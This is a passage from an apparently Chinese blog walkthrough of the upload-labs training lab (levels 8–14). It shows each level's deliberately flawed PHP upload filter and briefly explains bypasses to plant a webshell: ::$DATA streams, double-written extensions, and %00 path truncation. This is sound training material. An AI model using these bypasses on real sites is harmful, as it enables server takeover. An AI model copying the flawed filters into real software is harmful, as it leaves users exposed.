<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/5f39cc1b8cc44e82b541f528d067fadd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c39fe120d3ed4ae795d36bb3ba3291e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS-09"></a>PASS-09</h2><p>和第五题的区别是，代码并没有过滤掉<code>::$DATA</code>这个字符串的应用，我们可以利用流文件绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/4bd929fb704e47d6ad569b6b6f79e50c.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3c8ac218405c47bbb467e9801f924b8a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS-10"></a>PASS-10</h2><p>源码和第五题一模一样，利用过程略过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PASS-11"><a href="#PASS-11" class="headerlink" title="PASS-11"></a>PASS-11</h2><p>代码先写了黑名单，然后对黑名单后缀替换为空。所以可以利用双写后缀进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/eef123f0f52146cfadab0c53e6f3120d.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5a22dc5b90184cb591f324b7c9f2af91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-12"><a href="#PASS-12" class="headerlink" title="PASS-12"></a>PASS-12</h2><p>从源码中判断，是白名单过滤，只允许上传以下三种图片格式，这个也是我们在实战中比较常见的一种情形</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当我们抓包时，发现暴露了上传的路径。所以我们可以在路径后使用<code>%00</code>进行截断<br><img src="https://img-blog.csdnimg.cn/a35d577ab1a749da99c1a64f4244db42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>利用方式如下，顺带一提利用成功的条件必须是PHP版本小于5.3并且<code>magic_quotes_gpc</code>设置为Off。因此这种利用方式一般不怎么常见了，因为很少厂商架设网站时会同时满足这两个条件。经过反复测试，冰蝎马可以上传成功但是不能成功解析，所以只能选用一句话木马<br><img src="https://img-blog.csdnimg.cn/94728315296c40f9bcad70114bee754c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b1e8e8b580234200b8eb7591de34f8ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-13"><a href="#PASS-13" class="headerlink" title="PASS-13"></a>PASS-13</h2><p>和第十二关的主要区别是，img_path的提交方式由GET方式转换为POST方式。利用的方式也是使用%00进行截断，但是post和get不同的是，post不会像get对%00进行解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先先抓包分析，在post的上传路径上添加shell.php文件，上传格式改为jpg<br><img src="https://img-blog.csdnimg.cn/5623d63d5c0342ad91c2533a037d82ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后在hex中，70后添加byte，点击上传，因为hex的70转换成字符串形式就是p<br><img src="https://img-blog.csdnimg.cn/23be7739549043d5a45c55e7e7f76fa5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>最后上线成功<br><img src="https://img-blog.csdnimg.cn/5df24c3a0a1e49a4984a574517316fa5.png" alt="在这里插入图片描述"></p>
<h2 id="PASS-14"><a href="#PASS-14" class="headerlink" title="PASS-14"></a>PASS-14</h2><p>从代码层面上看，首先先以二进制形式读取文件内容的前两位，然后解包，通过拼接前两位字符判断文件类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span 